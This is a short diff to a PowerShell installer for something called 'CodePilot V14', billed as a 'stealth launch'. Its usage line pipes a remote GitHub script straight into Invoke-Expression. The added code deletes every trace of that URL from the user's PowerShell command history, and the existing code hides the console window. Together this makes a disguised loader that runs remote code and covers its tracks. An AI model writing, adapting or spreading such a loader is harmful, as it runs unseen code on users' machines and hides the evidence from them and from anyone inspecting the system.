@@ -1,6 +1,12 @@
 # CodePilot V14 — One-Line Install + Stealth Launch (Zero Input)
-# Usage: Start-Process powershell -W Hidden -Arg '-C "irm https://raw.githubusercontent.com/hyperlinken/whoa/more/install.ps1 | iex"'
-# Hide the console window — no files, no new processes
+# Usage: irm https://raw.githubusercontent.com/hyperlinken/whoa/more/install.ps1 | iex
+# Clean command history + hide console
+try {
+    $h = (Get-PSReadLineOption).HistorySavePath
+    if ($h -and (Test-Path $h)) {
+        (Get-Content $h) | Where-Object { $_ -notmatch 'raw\.githubusercontent\.com/hyperlinken/whoa' } | Set-Content $h
+    }
+} catch {}
 try {
     Add-Type -Name W -Namespace H -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int c);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();' -ErrorAction SilentlyContinue
     [H.W]::ShowWindow([H.W]::GetConsoleWindow(), 0) | Out-Null
